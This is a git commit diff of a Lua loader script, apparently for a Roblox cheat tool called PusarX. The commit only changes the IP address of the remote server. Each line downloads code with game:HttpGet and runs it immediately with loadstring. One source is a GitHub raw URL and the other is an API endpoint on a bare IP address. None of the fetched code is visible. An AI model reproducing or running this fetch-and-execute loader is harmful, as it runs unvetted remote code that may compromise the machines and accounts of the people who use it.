614ac3da336d2174234a9abed7f6e64e264446e2
Estevans1t0 <tgrow876@gmail.com>
2026-02-22 14:46:11 +0800

    Update PusarX-loader.lua

--- PusarX-loader.lua
+++ PusarX-loader.lua
@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Estevansit0/KJJK/refs/heads/main/PusarX-loader.lua"))()
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjU2NTU5M2Y5LTY0NDItNDM4NC1iYzQ2LTYxNmRhZGYwYzE0OCIsImtpbmQiOiJsb2FkZXIifQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjU2NTU5M2Y5LTY0NDItNDM4NC1iYzQ2LTYxNmRhZGYwYzE0OCIsImtpbmQiOiJsb2FkZXIifQ"))()
